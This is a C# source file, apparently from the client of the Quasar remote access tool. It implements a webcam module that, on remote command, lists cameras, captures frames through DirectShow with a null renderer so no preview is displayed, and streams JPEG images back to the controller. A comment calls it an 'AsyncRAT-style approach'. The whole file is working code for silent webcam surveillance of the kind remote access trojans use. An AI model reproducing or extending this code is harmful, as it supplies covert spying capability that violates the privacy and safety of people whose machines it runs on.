using DirectShowLib;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Quasar.Client.Messages
{
    /// <summary>
    /// Handles webcam capture using raw DirectShowLib (AsyncRAT-style approach).
    /// Uses ISampleGrabberCB for frame callbacks, bypassing AForge.
    /// This works on cameras where AForge fails (HP, Lenovo laptops, etc.).
    /// </summary>
    public class WebcamAsyncHandler : NotificationMessageProcessor, IDisposable, ISampleGrabberCB
    {
        private IFilterGraph2 _graphBuilder;
        private IMediaControl _mediaControl;
        private ISampleGrabber _sampleGrabber;
        private IBaseFilter _captureFilter;

        private int _videoWidth;
        private int _videoHeight;
        private volatile bool _isCapturing;
        private bool _isStarted;
        private ISender _client;

        private Bitmap _latestFrame;
        private readonly object _frameLock = new object();
        private readonly object _captureLock = new object();
        private readonly ManualResetEventSlim _firstFrameEvent = new ManualResetEventSlim(false);

        public override bool CanExecute(IMessage message) => message is GetWebcamsAsync ||
                                                              message is GetWebcamFrameAsync ||
                                                              message is DoWebcamAsyncStop;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetWebcamsAsync msg:
                    Execute(sender, msg);
                    break;
                case GetWebcamFrameAsync msg:
                    Execute(sender, msg);
                    break;
                case DoWebcamAsyncStop msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetWebcamsAsync message)
        {
            try
            {
                DsDevice[] devices = DsDevice.GetDevicesOfCat(FilterCategory.VideoInputDevice);
                string[] names = new string[devices.Length];
                for (int i = 0; i < devices.Length; i++)
                {
                    names[i] = devices[i].Name;
                }
                client.Send(new GetWebcamsAsyncResponse { WebcamNames = names });
            }
            catch (Exception)
            {
                client.Send(new GetWebcamsAsyncResponse { WebcamNames = new string[0] });
            }
        }

        private void Execute(ISender client, GetWebcamFrameAsync message)
        {
            try
            {
                _client = client;

                if (message.CreateNew)
                {
                    lock (_captureLock)
                    {
                        StopCapture();
                        _firstFrameEvent.Reset();
                        StartCapture(message.DeviceIndex);
                        _isStarted = true;
                    }
                    OnReport("Webcam (Async) session started");

                    // Wait for the first frame via DirectShow callback.
                    _firstFrameEvent.Wait(8000);
                }

                if (!_isStarted)
                    return;

                byte[] imageData = GetCurrentFrame(message.Quality);

                if (imageData == null)
                {
                    Thread.Sleep(200);
                }

                client.Send(new GetWebcamFrameAsyncResponse
                {
                    Image = imageData,
                    DeviceIndex = message.DeviceIndex,
                    Quality = message.Quality
                });
            }
            catch (Exception)
            {
                client.Send(new GetWebcamFrameAsyncResponse
                {
                    Image = null,
                    DeviceIndex = message.DeviceIndex,
                    Quality = message.Quality
                });
            }
        }

        private void Execute(ISender client, DoWebcamAsyncStop message)
        {
            lock (_captureLock)
            {
                _isStarted = false;
                StopCapture();
            }
            _client = null;
            OnReport("Webcam (Async) session stopped");
        }

        /// <summary>
        /// Starts DirectShow capture graph for the specified device.
        /// </summary>
        private void StartCapture(int deviceIndex)
        {
            DsDevice[] devices = DsDevice.GetDevicesOfCat(FilterCategory.VideoInputDevice);
            if (devices == null || devices.Length == 0 || deviceIndex >= devices.Length)
                return;

            DsDevice selectedDevice = devices[deviceIndex];
            int hr;

            try
            {
                // Create the Filter Graph
                _graphBuilder = (IFilterGraph2)new FilterGraph();
                _mediaControl = (IMediaControl)_graphBuilder;

                // Add the video capture source filter
                hr = _graphBuilder.AddSourceFilterForMoniker(selectedDevice.Mon, null, selectedDevice.Name, out _captureFilter);
                DsError.ThrowExceptionForHR(hr);

                // Create and configure the Sample Grabber
                _sampleGrabber = (ISampleGrabber)new SampleGrabber();
                IBaseFilter grabberFilter = (IBaseFilter)_sampleGrabber;

                AMMediaType mediaType = new AMMediaType();
                mediaType.majorType = MediaType.Video;
                mediaType.subType = MediaSubType.RGB24;
                mediaType.formatType = FormatType.VideoInfo;

                hr = _sampleGrabber.SetMediaType(mediaType);
                DsError.ThrowExceptionForHR(hr);

                hr = _graphBuilder.AddFilter(grabberFilter, "SampleGrabber");
                DsError.ThrowExceptionForHR(hr);

                // Add a null renderer (we don't want to display, just grab frames)
                IBaseFilter nullRenderer = (IBaseFilter)new NullRenderer();
                hr = _graphBuilder.AddFilter(nullRenderer, "NullRenderer");
                DsError.ThrowExceptionForHR(hr);

                // Connect: Source -> SampleGrabber -> NullRenderer
                ConnectFilters(_graphBuilder, _captureFilter, grabberFilter);
                ConnectFilters(_graphBuilder, grabberFilter, nullRenderer);

                // Get the actual video dimensions from the connected media type
                AMMediaType connectedType = new AMMediaType();
                hr = _sampleGrabber.GetConnectedMediaType(connectedType);
                DsError.ThrowExceptionForHR(hr);

                VideoInfoHeader videoInfo = (VideoInfoHeader)Marshal.PtrToStructure(
                    connectedType.formatPtr, typeof(VideoInfoHeader));
                _videoWidth = videoInfo.BmiHeader.Width;
                _videoHeight = videoInfo.BmiHeader.Height;
                DsUtils.FreeAMMediaType(connectedType);

                // Set the callback (mode 1 = BufferCB)
                hr = _sampleGrabber.SetCallback(this, 1);
                DsError.ThrowExceptionForHR(hr);

                // Don't buffer samples — we want one-shot mode
                hr = _sampleGrabber.SetOneShot(false);
                DsError.ThrowExceptionForHR(hr);

                // Start the graph
                _isCapturing = true;
                hr = _mediaControl.Run();
                DsError.ThrowExceptionForHR(hr);
            }
            catch
            {
                StopCapture();
                throw;
            }
        }

        /// <summary>
        /// Connects two DirectShow filters by their first available pins.
        /// </summary>
        private void ConnectFilters(IGraphBuilder graph, IBaseFilter outputFilter, IBaseFilter inputFilter)
        {
            IPin outPin = DsFindPin.ByDirection(outputFilter, PinDirection.Output, 0);
            IPin inPin = DsFindPin.ByDirection(inputFilter, PinDirection.Input, 0);
            try
            {
                int hr = graph.Connect(outPin, inPin);
                DsError.ThrowExceptionForHR(hr);
            }
            finally
            {
                if (outPin != null) Marshal.ReleaseComObject(outPin);
                if (inPin != null) Marshal.ReleaseComObject(inPin);
            }
        }

        /// <summary>
        /// Stops the DirectShow capture graph and releases all COM resources.
        /// </summary>
        private void StopCapture()
        {
            _isCapturing = false;

            try
            {
                if (_mediaControl != null)
                    _mediaControl.Stop();
            }
            catch { }

            try
            {
                if (_sampleGrabber != null)
                {
                    _sampleGrabber.SetCallback(null, 0);
                    Marshal.ReleaseComObject(_sampleGrabber);
                }
            }
            catch { }
            _sampleGrabber = null;

            try
            {
                if (_captureFilter != null)
                    Marshal.ReleaseComObject(_captureFilter);
            }
            catch { }
            _captureFilter = null;

            try
            {
                if (_graphBuilder != null)
                    Marshal.ReleaseComObject(_graphBuilder);
            }
            catch { }
            _graphBuilder = null;
            _mediaControl = null;

            lock (_frameLock)
            {
                _latestFrame?.Dispose();
                _latestFrame = null;
            }
        }

        // ── ISampleGrabberCB implementation ──

        /// <summary>
        /// Not used — we use BufferCB instead.
        /// </summary>
        int ISampleGrabberCB.SampleCB(double SampleTime, IMediaSample pSample)
        {
            return 0;
        }

        /// <summary>
        /// Called by DirectShow when a buffer-processed frame is available.
        /// Creates a Bitmap from the raw RGB24 buffer.
        /// </summary>
        int ISampleGrabberCB.BufferCB(double SampleTime, IntPtr pBuffer, int BufferLen)
        {
            if (!_isCapturing || _videoWidth <= 0 || _videoHeight <= 0)
                return 0;

            try
            {
                // Create bitmap from raw RGB24 buffer
                // DirectShow buffers are bottom-up, need to flip
                using (var bmp = new Bitmap(_videoWidth, _videoHeight, _videoWidth * 3,
                    PixelFormat.Format24bppRgb, pBuffer))
                {
                    bmp.RotateFlip(RotateFlipType.RotateNoneFlipY);

                    lock (_frameLock)
                    {
                        _latestFrame?.Dispose();
                        _latestFrame = (Bitmap)bmp.Clone();
                    }
                }

                // Signal first frame received
                if (!_firstFrameEvent.IsSet)
                    _firstFrameEvent.Set();
            }
            catch
            {
                // Suppress frame processing errors
            }

            return 0;
        }

        /// <summary>
        /// Gets the latest captured frame as JPEG-encoded bytes.
        /// </summary>
        private byte[] GetCurrentFrame(int quality)
        {
            Bitmap frame;
            lock (_frameLock)
            {
                if (_latestFrame == null)
                    return null;
                frame = (Bitmap)_latestFrame.Clone();
            }

            try
            {
                using (frame)
                using (var ms = new MemoryStream())
                {
                    var encoderParams = new EncoderParameters(1);
                    encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)quality);
                    var jpegCodec = GetJpegCodec();
                    if (jpegCodec != null)
                        frame.Save(ms, jpegCodec, encoderParams);
                    else
                        frame.Save(ms, ImageFormat.Jpeg);
                    return ms.ToArray();
                }
            }
            catch
            {
                frame?.Dispose();
                return null;
            }
        }

        private ImageCodecInfo GetJpegCodec()
        {
            foreach (var codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.FormatID == ImageFormat.Jpeg.Guid)
                    return codec;
            }
            return null;
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_captureLock)
                {
                    _isStarted = false;
                    StopCapture();
                }
                _firstFrameEvent.Dispose();
            }
        }
    }
}
